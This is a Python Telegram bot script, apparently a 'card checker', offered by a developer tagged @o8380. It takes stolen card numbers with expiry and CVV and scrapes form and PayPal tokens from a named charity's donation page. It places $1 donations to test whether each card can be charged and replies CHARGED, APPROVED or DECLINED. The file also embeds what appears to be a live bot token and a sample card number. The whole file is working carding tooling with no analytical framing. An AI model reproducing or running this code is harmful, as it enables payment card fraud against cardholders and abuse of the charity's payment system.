import telebot
import requests
import re
import base64
from requests_toolbelt.multipart.encoder import MultipartEncoder

TOKEN = "8740209519:AAFqn8kO0XgUfVfz6RHRXKWk8ZhCyiP7vqk"
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

def check_gateway(ccx):
    s = requests.Session()
    ccx = ccx.strip()
    parts = ccx.split("|")
    pan = parts[0]
    month = parts[1]
    year = parts[2][-2:]
    cvv = parts[3]
    
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
    r = s.get('https://cjrimpact.org/donations/425-3-2/', headers=headers)
    
    if r.status_code != 200:
        return "ERROR: Site unreachable"
    
    try:
        form_id = re.search(r'name="give-form-id" value="(.*?)"', r.text).group(1)
        form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text).group(1)
        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', r.text).group(1)
        token_enc = re.search(r'"data-client-token":"(.*?)"', r.text).group(1)
        token_dec = base64.b64decode(token_enc).decode()
        access_token = re.search(r'"accessToken":"(.*?)"', token_dec).group(1)
    except:
        return "ERROR: Failed to parse page"
    
    m = MultipartEncoder({
        'give-form-id-prefix': (None, form_prefix),
        'give-form-id': (None, form_id),
        'give-form-hash': (None, form_hash),
        'give-amount': (None, '1.00'),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, 'Test'),
        'give_last': (None, 'User'),
        'give_email': (None, 'test@email.com'),
        'give-gateway': (None, 'paypal-commerce'),
    })
    
    headers = {'Content-Type': m.content_type, 'User-Agent': 'Mozilla/5.0'}
    r = s.post('https://cjrimpact.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order', 
               headers=headers, data=m)
    
    try:
        order_id = r.json()['data']['id']
    except:
        return "ERROR: Order creation failed"
    
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
    }
    
    payload = {
        'payment_source': {
            'card': {
                'number': pan,
                'expiry': f'20{year}-{month}',
                'security_code': cvv
            }
        }
    }
    
    s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
           headers=headers, json=payload)
    
    m2 = MultipartEncoder({
        'give-form-id-prefix': (None, form_prefix),
        'give-form-id': (None, form_id),
        'give-form-hash': (None, form_hash),
        'give-amount': (None, '1.00'),
        'payment-mode': (None, 'paypal-commerce'),
        'give-gateway': (None, 'paypal-commerce'),
    })
    
    headers = {'Content-Type': m2.content_type, 'User-Agent': 'Mozilla/5.0'}
    r = s.post(f'https://cjrimpact.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={order_id}',
               headers=headers, data=m2)
    
    response_text = r.text.lower()
    
    if 'true' in response_text or 'success":true' in response_text:
        return "ORDER_PLACED - CHARGE!"
    elif 'insufficient_funds' in response_text:
        return "INSUFFICIENT_FUNDS - APPROVED"
    else:
        return "DECLINED"

def reg(cc):
    parts = re.split(r'\D+', cc)
    if len(parts) >= 4:
        return f"{parts[0]}|{parts[1].zfill(2)}|{parts[2]}|{parts[3]}"
    return None

@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg, "Welcome! Send: /pp 5165780107772615|06|29|469")

@bot.message_handler(func=lambda m: m.text.startswith('/pp'))
def check(msg):
    try:
        card = msg.text.split(' ', 1)[1]
    except:
        bot.reply_to(msg, "Usage: /pp card|month|year|cvv")
        return
    
    card = reg(card)
    if not card:
        bot.reply_to(msg, "Invalid format!")
        return
    
    m = bot.reply_to(msg, "Checking...")
    result = check_gateway(card)
    card_display = card.replace("|", " | ")
    
    if "CHARGE" in result:
        final = f"CHARGED\ncc - {card_display}\n\nGate - Paypal Custom 1$\nPrice - $1.00\nDev: @o8380"
    elif "APPROVED" in result:
        final = f"APPROVED (Insufficient)\n\nCard: {card_display}\nResult: {result}\nDev: @o8380"
    else:
        final = f"DECLINED\n\nCard: {card_display}\nResult: {result}\nDev: @o8380"
    
    bot.edit_message_text(final, chat_id=msg.chat.id, message_id=m.message_id, parse_mode="HTML")

print("Bot Running | Gateway: CJRI Impact 1$ | Dev: @o8380")
bot.infinity_polling()
